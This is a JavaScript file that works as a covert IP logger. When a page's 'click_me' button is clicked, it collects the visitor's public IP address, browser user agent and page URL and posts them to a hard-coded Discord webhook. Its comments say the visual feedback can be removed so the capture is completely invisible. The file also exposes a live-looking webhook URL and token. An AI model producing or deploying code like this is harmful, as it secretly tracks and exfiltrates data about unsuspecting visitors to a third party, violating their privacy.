// Discord Webhook Configuration
const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1433662355585105941/bddGvPPn1upOvMFDbblqo-1Am4YjajmzICc-Ndifi8eLWZsBXEx94Eo0LyQDyZv2lwGW';

// Function to get IP address
async function getIP() {
    try {
        const response = await Promise.race([
            fetch('https://api.ipify.org?format=json'),
            fetch('https://ipapi.co/json/')
        ]);

        if (!response.ok) {
            throw new Error('Network response was not ok');
        }

        const data = await response.json();
        return data.ip || data.ipv4;
    } catch (error) {
        console.error('Error fetching IP:', error);
        return null;
    }
}

// Function to send data to Discord
async function sendToDiscord(ip) {
    try {
        if (DISCORD_WEBHOOK_URL === '') {
            console.error('Discord webhook URL not configured');
            return false;
        }

        const discordPayload = {
            content: `IP Logged\n**IP:** ${ip}\n**Time:** ${new Date().toLocaleString()}\n**User Agent:** ${navigator.userAgent.substring(0, 100)}...`,
            embeds: [
                {
                    title: "IP Address Captured",
                    color: 15105570, // Orange color
                    fields: [
                        {
                            name: "IP Address",
                            value: ip,
                            inline: true
                        },
                        {
                            name: "Timestamp",
                            value: new Date().toLocaleString(),
                            inline: true
                        },
                        {
                            name: "Page",
                            value: window.location.href,
                            inline: false
                        }
                    ],
                    footer: {
                        text: "IP Logger"
                    },
                    timestamp: new Date().toISOString()
                }
            ]
        };

        const response = await fetch(DISCORD_WEBHOOK_URL, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(discordPayload),
        });

        return response.ok;
    } catch (error) {
        console.error('Error sending to Discord:', error);
        return false;
    }
}

// Main function to handle button click
async function handleButtonClick() {
    // Add a subtle visual feedback (optional)
    const button = document.getElementById('click_me');
    const originalText = button.textContent;
    
    // Brief visual feedback (can be removed if you want completely invisible)
    button.textContent = 'click_me!.nothin';
    button.disabled = true;
    
    try {
        const ip = await getIP();
        if (ip) {
            await sendToDiscord(ip);
            console.log('IP successfully sent to Discord:', ip);
        } else {
            console.error('Failed to get IP address');
        }
    } catch (error) {
        console.error('Error in handleButtonClick:', error);
    } finally {
        // Restore button state after a short delay
        setTimeout(() => {
            button.textContent = originalText;
            button.disabled = false;
        }, 1000);
    }
}

// Add event listener when DOM is loaded
document.addEventListener('DOMContentLoaded', function() {
    const button = document.getElementById('click_me');
    if (button) {
        button.addEventListener('click', handleButtonClick);
        console.log('IP logger initialized - button click will send IP to Discord');
    } else {
        console.error('Button with id "click_me" not found');
    }
});